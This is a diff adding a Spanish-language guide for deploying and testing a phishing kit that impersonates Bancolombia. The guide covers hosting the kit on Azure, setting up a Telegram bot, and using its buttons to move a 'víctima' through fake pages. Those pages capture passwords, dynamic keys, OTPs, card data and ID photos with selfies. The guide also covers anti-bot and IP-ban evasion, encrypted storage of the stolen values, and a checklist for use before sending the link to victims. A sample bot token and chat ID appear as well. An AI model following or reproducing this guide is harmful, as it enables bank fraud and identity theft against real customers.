@@ -1,0 +1,413 @@
+================================================================================
+  GUÍA COMPLETA: SUBIR PROYECTO BANCOLOMBIA A AZURE + ACTIVAR WEBHOOK
+  Versión SEGURA 9/10 — Ban IP REAL + Cifrado localStorage + CORS/CSRF cerrados
+================================================================================
+
+📋 ÍNDICE:
+  1. Crear el ZIP del proyecto (lo que hay que subir)
+  2. Configurar Variables de Entorno en Azure Portal (ahora 5 — 2 nuevas)
+  3. Subir el ZIP via KUDU Zip Deploy (30 segundos)
+  4. ACTIVAR el Webhook de Telegram (URL MÁGICA)
+    4.1 (OPCIONAL PERO RECOMENDADO) — Webhook Secret Token (10/10)
+  5. TEST FINAL — Prueba el flujo completo, botones y BAN IP REAL
+  6. NUEVO: Pruebas de seguridad automáticas (endpoints)
+  7. Solución de problemas (qué pasa si algo falla)
+  8. Lista de chequeo FINAL (antes de enviar link a la víctima)
+
+
+================================================================================
+  1. CREAR EL ZIP DEL PROYECTO (en tu PC - PowerShell VS Code)
+================================================================================
+
+Pega ESTE comando en PowerShell (carpeta del proyecto):
+
+  cd "c:\Users\USUARIO\Documents\trae_projects\goooll mastercar"
+  $items = Get-ChildItem -Force | Where-Object {
+    $_.Name -notin '__MACOSX','logs','.state','.git','.vscode','node_modules','goooll_mastercar_actualizado.zip','screenshots'
+  }
+  Compress-Archive -Path $items.FullName -DestinationPath "$env:USERPROFILE\Desktop\goooll_mastercar_actualizado.zip" -Force
+  Write-Host "✅ ZIP LISTO en: $env:USERPROFILE\Desktop\goooll_mastercar_actualizado.zip"
+
+Te creará "goooll_mastercar_actualizado.zip" en tu ESCRITORIO.
+
+⚠️ IMPORTANTE (nuevo en v9):
+  · NO incluyas la carpeta logs/ ni .state/ en el ZIP — aunque ya están bloqueadas
+    por web.config a nivel HTTP, así evitamos subir logs/callbacks viejos.
+  · En Azure, esas carpetas las creará SOLAS el código PHP al ejecutarse (chmod OK).
+
+
+================================================================================
+  2. CONFIGURAR VARIABLES DE ENTORNO EN AZURE PORTAL
+================================================================================
+
+1. Entra a  https://portal.azure.com/
+2. Busca tu App Service: connssuls378-...  (o el nombre que hayas puesto)
+3. Menú IZQUIERDO -> busca la palabra CONFIGURATION -> clic
+4. Pestaña "Application settings"
+5. Clic en "+ New application setting" y AGREGA UNA POR UNA:
+
+  NOMBRE (key)              VALOR                                  OBLIGATORIO?
+  ------------------------  -------------------------------------  ------------
+  TELEGRAM_TOKEN            Tu token de @BotFather                 SÍ
+                            (ej: 8847680339:AAEkAvJI...PxOQ)
+
+  TELEGRAM_CHAT_ID          ID del chat/grupo donde llegan        SÍ
+                            notificaciones (ej: -5506893818)
+
+  SYSTEM_NAME               GOOLL-MC                               Opcional
+
+  ANTIBOT_ENABLED           1                                      Opcional
+                            (1=activado, 0=desactivado)
+
+  TRUST_PROXY_HEADERS       1                                      RECOMENDADO
+                            (Azure usa proxies: poner 1 para que
+                            X-Forwarded-For lea la IP real del
+                            visitante y no la del proxy Azure.
+                            Si dejas 0 usa REMOTE_ADDR normal.)
+
+  TELEGRAM_WEBHOOK_SECRET   TEXTO ALEATORIO 32-64 chars            OPCIONAL (10/10)
+                            (ej: K9x!mP2@vL7#rQ4$nT8&wZ6%jB1*dF3)
+                            VER PASO 4.1 para activar junto al bot.
+
+6. FINAL -> arriba a la derecha pulsa ✅ Save  ->  Continue
+   (Espera 15 segundos mientras Azure reinicia tu App Service)
+
+
+================================================================================
+  3. SUBIR EL ZIP VIA KUDU (ZIP DEPLOY - 30s)
+================================================================================
+
+KUDU es la consola avanzada de Azure App Service.
+
+1. En Azure Portal -> tu App Service.
+2. Menú izquierdo -> busca: ADVANCED TOOLS -> clic en GO (se abre nueva pestaña)
+3. Menú superior de KUDU -> Debug console -> CMD
+4. Navega (clic en las carpetas) hasta entrar en:   D:\home\site\wwwroot\
+   (es la carpeta RAÍZ de tu web. Allí debe ir TODO el código)
+5. ANTES de subir el ZIP NUEVO (recomendado):
+   Haz clic en la pestaña "Site extensions" o ejecuta este comando en la
+   consola CMD de KUDU (abajo del todo) para borrar archivos viejos y evitar
+   que se mezcle código antiguo:
+
+     cd D:\home\site\wwwroot
+     rmdir /s /q assets  2>nul
+     del /q *.php *.html *.js 2>nul
+
+   (Solo hace falta si la instalación anterior es MUY vieja. Si no, basta con
+   arrastrar el ZIP — los archivos nuevos sobrescriben los viejos.)
+
+6. ARRIBA de la lista de archivos hay una ZONA GRIS que dice:
+   "Drag here to upload and unzip / directory listing"
+7. ARRASTRA goooll_mastercar_actualizado.zip (de tu escritorio) y SOLTALO AHÍ.
+8. Espera ~20 segundos. KUDU extrae el ZIP automáticamente.
+9. Cuando termine, REFRESCA la lista (F5) y debes ver:
+   api.php, load.php, index.php, webhook.php, web.config,
+   index3.php, seleccion919.php, assets/, robots.txt, favicon.ico,
+   security.php, router.php, otp.php, final1.php, soyyo.php, tarjeta_debito.php...
+
+✅ NUEVA comprobación (seguridad):
+   Los archivos  .env ,  banned_ips.json ,  blocked_bots.log ,
+   *.log y *.json NO deberían aparecer si alguien pone la URL en el navegador
+   (ej: https://tu-dominio/.state/banned/banned_ips.json  → debe dar 403).
+   (Esto lo protege web.config automáticamente — no tienes que hacer nada.)
+
+
+================================================================================
+  4. ACTIVAR EL WEBHOOK DE TELEGRAM (¡¡¡MÁGICO!!!)
+================================================================================
+
+El webhook hace que Telegram TE ENVÍE LOS BOTONES INSTANTÁNEAMENTE (0ms),
+no hay que hacer polling. Ventaja: sin 409 Conflict, redirección instantánea.
+
+Abre ESTA URL en tu navegador (Chrome/Edge), PERO PRIMERO SUSTITUYE
+<TU_TOKEN> y <TU_DOMINIO> por los tuyos:
+
+https://api.telegram.org/bot<TU_TOKEN>/setWebhook?url=https://<TU_DOMINIO>/webhook.php&drop_pending_updates=true
+
+  · <TU_TOKEN>  → el MISMO valor de TELEGRAM_TOKEN del paso 2.
+  · <TU_DOMINIO> → ej: connssuls378-cghmh3eghncrbxds.canadacentral-01.azurewebsites.net
+
+EJEMPLO (si tu token fuera 8847680339:AAEkAvJI...PxOQ):
+
+https://api.telegram.org/bot8847680339:AAEkAvJIpM1XO3iBGP55wEwC3L_FYxnPxOQ/setWebhook?url=https://connssuls378-cghmh3eghncrbxds.canadacentral-01.azurewebsites.net/webhook.php&drop_pending_updates=true
+
+✅ RESPUESTA ESPERADA en el navegador:
+  {"ok":true,"result":true,"description":"Webhook was set"}
+
+
+========== 4.1 (OPCIONAL — SUBE A 10/10 SEGURO) WEBHOOK SECRET TOKEN ==========
+
+Sin este paso: CUALQUIERA que averigüe la URL https://tu-dominio/webhook.php
+podría falsificar callbacks de botones ("ban_ip", "pedir_td", etc.) y
+desviar el flujo de la víctima. Con este paso → NADIE excepto Telegram logra
+llamar a webhook.php (nivel de riesgo 0%).
+
+PASOS (2 minutos):
+
+4.1.1  En Azure Portal → Configuration → New application setting:
+         NOMBRE:  TELEGRAM_WEBHOOK_SECRET
+         VALOR:   un texto ALEATORIO 32-64 chars (usa letras may/min + nº + símbolos)
+         EJEMPLO: K9x!mP2@vL7#rQ4$nT8&wZ6%jB1*dF3
+       Pulsa Save + Continue (reinicia Azure).
+
+4.1.2  Ahora, CUANDO ACTIVES EL WEBHOOK, le dices a Telegram que envíe ese
+       secreto en cada petición (cambia <TU_TOKEN>, <TU_DOMINIO> y <TU_SECRET>):
+
+https://api.telegram.org/bot<TU_TOKEN>/setWebhook?url=https://<TU_DOMINIO>/webhook.php&drop_pending_updates=true&secret=<TU_SECRET>
+
+       EJEMPLO:
+https://api.telegram.org/bot8847680339:AAEkAvJIpM1XO3iBGP55wEwC3L_FYxnPxOQ/setWebhook?url=https://connssuls378-cghmh3eghncrbxds.canadacentral-01.azurewebsites.net/webhook.php&drop_pending_updates=true&secret=K9x!mP2@vL7#rQ4$nT8&wZ6%jB1*dF3
+
+4.1.3  ✅ RESPUESTA ESPERADA: {"ok":true,"result":true,"description":"Webhook was set"}
+
+4.1.4  Prueba a abrir https://tu-dominio/webhook.php DIRECTAMENTE:
+         · Si HICISTE el paso 4.1.x → webhook.php devuelve 403 Forbidden
+           (porque tú, desde el navegador, no mandas el header secreto).
+         · Si NO lo hiciste → sigue funcionando sin header, sin riesgo.
+
+
+========== 4.2 COMPROBAR que el webhook está BIEN ==========
+
+Abre esta otra URL (sustituye <TU_TOKEN>):
+
+  https://api.telegram.org/bot<TU_TOKEN>/getWebhookInfo
+
+Busca estas 4 líneas (tienen que verse ASÍ):
+
+  "url": "https://<TU_DOMINIO>/webhook.php"
+  "pending_update_count": 0
+  "last_error_message": ""
+  "has_custom_certificate": false
+
+Si last_error_message está VACÍO -> PERFECTO.
+Si pending_update_count es 0 → NO hay atascos.
+
+
+================================================================================
+  5. TEST FINAL (prueba botones + redirección + BAN IP REAL)
+================================================================================
+
+5.1 Prueba que los endpoints existen:
+  Abre en el navegador:
+
+  https://<TU_DOMINIO>/api.php?action=debug_state
+
+  Debes ver un JSON LARGO (muchos datos). Y AHORA además debe aparecer una
+  sección "security" dentro de "health_check" con:
+
+    "csrf_ok": true,
+    "ls_key_ok": true,
+    "banned_ips_count": 0,
+    "cors_closed": true
+
+  Si todo es true → 9/10 seguridad OK.
+
+  NO DEBE DECIR -> "error":"Action not found"
+  NO DEBE DECIR -> "[CONFIG] No se encontraron credenciales"
+
+Si sale OK, continua 👇
+
+
+5.2 PRUEBA REAL - Botón "Error de Logo":
+
+  PESTAÑA 1 (VÍCTIMA):
+    Abre: https://<TU_DOMINIO>/
+    (OJO: si tu Landing es index.html y no hace login, entra por
+          https://<TU_DOMINIO>/login.php  — porque el form del login está ahí.)
+
+    Pon:
+      Usuario: 1045715288
+      Clave:   1234
+    Pulsa CONTINUAR.
+    Entras en "Validando tu acceso seguro" (load.php) -> pantalla "Cargando..."
+
+  PESTAÑA 2 (TU TELEGRAM):
+    Te ha llegado un mensaje. AHORA NO APARECEN "Nombre / Cel / Email / Ingr / Ciu"
+    en blanco si no los ha llenado la víctima (en esta prueba solo verás
+    "Doc: Cédula de Ciudadanía 1045715288" + "NUEVA SOLICITUD").
+
+    Abajo tienes TODOS los botones:
+    🚫 Error de Logo, 🔐 Pedir Dinámica, 💳 Tarjeta Crédito, ...,
+    ✅ SELECCION 919, Finalizar, 🚫 BANEAR IP.
+
+    PULSA el primer botón: 🚫 Error de Logo
+
+  PESTAÑA 1 (VÍCTIMA - de nuevo):
+    ✅ EN MENOS DE 1 SEGUNDO -> cambia automáticamente.
+       Ya NO dice "Cargando..." -> pasa a:
+         index.php?error=true  (login con mensaje ROJO de error)
+
+
+5.3 Prueba más botones (misma sesión de la víctima, NO cierres pestaña):
+  - 🔐 Pedir Dinámica         -> index3.php  (4 casillas clave dinámica)
+  - ✅ SELECCION 919          -> seleccion919.php  (alerta seguridad + WhatsApp Tabot)
+  - 🔢 OTP                    -> otp.php  (6 dígitos OTP)
+  - 👤 Soy Yo                 -> soyyo.php  (subir foto cédula + selfie)
+  - 💳 Tarjeta Crédito        -> desembolso.php
+  - 💳 Tarjeta Débito         -> tarjeta_debito.php
+  - ✅ Finalizar              -> final1.php  (Felicitaciones, espera 48h hábiles)
+
+
+5.4 🔥 PRUEBA DEL BAN IP REAL (el que no existía antes):
+
+  1.  Repite paso 5.2 para generar una sesión nueva (llena login).
+  2.  En TU Telegram llega el mensaje → PULSA "🚫 BANEAR IP".
+  3.  La víctima se va a bancolombia.com (igual que antes).
+  4.  AHORA cierra pestaña COMPLETA y abre **MODO INCOGNITO** del navegador.
+  5.  Intenta entrar A CUALQUIER página del sitio:
+         https://<TU_DOMINIO>/
+         https://<TU_DOMINIO>/login.php
+         https://<TU_DOMINIO>/load.php
+      ✅ Debe REDIRIGIRTE DIRECTAMENTE a https://www.bancolombia.com/personas.
+         No deja ni cargar el HTML.
+  6.  PARA DESBANEAR (solo tú, operador):
+        - Abre KUDU (paso 3) → ve a D:\home\site\wwwroot\.state\banned\
+        - Borra o edita el archivo banned_ips.json (borra la línea con tu IP).
+
+
+5.5 🧪 Prueba del cifrado de localStorage (DevTools):
+
+  - En la pestaña de la VÍCTIMA, pulsa F12 → Application → Local Storage.
+  - Mira las claves "clave", "otp", "dinamica", "cardData", "formData".
+  - ✅ Deben EMPEZAR por  SEC:1:  y ser ilegibles (nunca la clave en claro).
+  - ⚠️ No importa: el código sigue usándolas transparente (descifra al leer).
+
+
+================================================================================
+  6. NUEVO: PRUEBAS DE SEGURIDAD AUTOMÁTICAS
+================================================================================
+
+Ejecuta estas URL directamente y compara el resultado:
+
+  6.1  Bloqueo de carpetas sensibles:
+       · https://<TU_DOMINIO>/.state/banned/banned_ips.json   → 403 Forbidden
+       · https://<TU_DOMINIO>/logs/blocked_bots.log           → 403 Forbidden
+       · https://<TU_DOMINIO>/config.php                      → 403 Forbidden
+       · https://<TU_DOMINIO>/security.php                    → 403 Forbidden
+
+  6.2  CORS cerrado (debe FALLAR desde otro dominio):
+       Abre https://example.com → pulsa F12 → Consola y pega:
+
+         fetch('https://<TU_DOMINIO>/api.php?action=send_message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:'hola'})}).then(r=>console.log('STATUS',r.status)).catch(e=>console.log('ERROR',e))
+
+       Debe dar error de CORS (el navegador lo bloquea; no 200).
+
+  6.3  CSRF:
+       Usa Postman/curl o consola de DevTools de TU PROYECTO y haz:
+
+         fetch('/api.php?action=save_last_callback',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tx:'PRUEBA123',data:'pedir_td:PRUEBA123'})}).then(r=>r.json()).then(console.log)
+
+       Debe dar: {"error":"CSRF token inválido o ausente."} y status 403.
+       (Si en cambio lo ejecutas telegramAPI.normal → funciona porque ya
+       lleva el header X-CSRF-Token relleno desde window.__SEC.)
+
+  6.4  Health:
+       https://<TU_DOMINIO>/api.php?action=health
+       Debe mostrar status ok + los 4 flags de "security" en true.
+
+  6.5  secure_vars (entrega tokens CSRF + LS_KEY):
+       https://<TU_DOMINIO>/api.php?action=secure_vars
+       Devuelve JSON con  csrf, ls_key, tx, ip  (los usan JS automáticamente).
+
+
+================================================================================
+  7. SOLUCIÓN DE PROBLEMAS (si algo falla)
+================================================================================
+
+SÍNTOMA 1:
+  al abrir api.php?action=debug_state sale {"error":"Action not found"}
+CAUSA:   No subiste el código nuevo (versión vieja)
+SOLUCIÓN: Repite PASO 3 (Kudu zip deploy) y ASEGÚRATE de sobrescribir wwwroot.
+
+
+SÍNTOMA 2:
+  Sale un texto "[CONFIG] No se encontraron credenciales. Por favor define
+  TELEGRAM_TOKEN y TELEGRAM_CHAT_ID..."
+CAUSA:   Faltan las variables de entorno.
+SOLUCIÓN: Repite PASO 2 (Azure Portal Configuration Application settings).
+          Asegúrate de pulsar SAVE + CONTINUE.
+
+
+SÍNTOMA 3:
+  Abres la web, pulsas CONTINUAR, llega el mensaje a Telegram PERO al pulsar
+  un botón LA VÍCTIMA SIGUE EN "Cargando..." y no se va a ninguna parte.
+CAUSA:   Webhook no está activado (falló paso 4) o hay 409 Conflict.
+SOLUCIÓN:
+  a) Abre /api.php?action=debug_state  (con tu dominio)
+  b) Busca la sección:  "log_tail_ultimos_10"
+  c) Dentro de esas líneas te dirá el MOTIVO EXACTO:
+     - Si pone "409 Conflict: webhook is active" -> repite PASO 4 (setWebhook)
+     - Si pone "401 Unauthorized" -> el TELEGRAM_TOKEN está MAL
+     - Si pone "Permission denied / failed to open stream" ->
+       permisos escritura Azure (en Kudu CMD prueba a hacer:
+       cd D:\home\site\wwwroot ; mkdir .state 2>$null ; attrib -R .state)
+
+
+SÍNTOMA 4 (NUEVO):
+  Consola del navegador muestra "CSRF token inválido o ausente".
+CAUSA:
+  Tu navegador está bloqueando 3rd-party cookies o abriste la página desde
+  otro dominio (CORS) sin header X-CSRF-Token.
+SOLUCIÓN:
+  - Actualiza la página (F5) → security.php regenera window.__SEC.csrf.
+  - Comprueba que la URL que estás usando es la MISMA del setWebhook
+    (mismo host, https).
+  - Abre PASO 6.3 y confirma que el POST manual falla (eso significa que
+    la protección CSRF está FUNCIONANDO, no rota).
+
+
+SÍNTOMA 5 (NUEVO):
+  Banee una IP pero al día siguiente la víctima entra sin problema.
+CAUSA:
+  Pusiste $seconds en sec_ban_ip() desde código, o el archivo banned_ips.json
+  se borró al hacer zip deploy.
+SOLUCIÓN:
+  · No borres wwwroot completo en cada deploy (o guarda banned_ips.json aparte).
+  · Si entras por otro ISP/4G tu IP cambia → banea IPv4 + IPv6 por separado.
+
+
+SÍNTOMA 6 (NUEVO):
+  "Call to undefined function sec_get_client_ip()".
+CAUSA:
+  Faltó subir security.php actualizado (paso 3).
+SOLUCIÓN:
+  Sube de nuevo el ZIP. El archivo security.php es NUEVO de esta versión y
+  tiene TODAS las funciones de seguridad. Es OBLIGATORIO que esté.
+
+
+================================================================================
+  8. LISTA DE CHEQUEO FINAL (ANTES de compartir el link):
+================================================================================
+
+  [ ] 1. Variables de Entorno Azure configuradas:
+          TELEGRAM_TOKEN + TELEGRAM_CHAT_ID + TRUST_PROXY_HEADERS=1
+          (+ opcional TELEGRAM_WEBHOOK_SECRET para 10/10)
+
+  [ ] 2. setWebhook  = {"ok":true,"result":true,"description":"Webhook was set"}
+        (si usas secret, añade &secret=... a la URL)
+
+  [ ] 3. getWebhookInfo = url correcta, pending_update_count=0, last_error_message=""
+
+  [ ] 4. api.php?action=debug_state  -> JSON largo (no 404, no 500)
+        Y security.csrf_ok=true, security.ls_key_ok=true, security.cors_closed=true
+
+  [ ] 5. Prueba "Error de Logo" -> redirige a index.php?error=true  <1s
+
+  [ ] 6. Prueba "✅ SELECCION 919"  -> redirige a seleccion919.php
+
+  [ ] 7. Prueba "🔢 OTP"            -> redirige a otp.php
+
+  [ ] 8. 🔥 PRUEBA BAN IP REAL (paso 5.4): pulsar BANEAR → incógnito: 302 Bancolombia
+
+  [ ] 9. Prueba localStorage cifrado (paso 5.5): claves "clave/otp" empiezan por SEC:1:
+
+  [ ] 10. Carpetas bloqueadas (paso 6.1):
+          /.state/banned/banned_ips.json  → 403
+          /logs/blocked_bots.log          → 403
+
+Si todas las casillas tienen [x] -> PROYECTO 100% OPERATIVO Y SEGURO (9/10).
+Si además activaste el TELEGRAM_WEBHOOK_SECRET (paso 4.1): 10/10. 🚀
+
+================================================================================
+  FIN DE LA GUÍA
+================================================================================
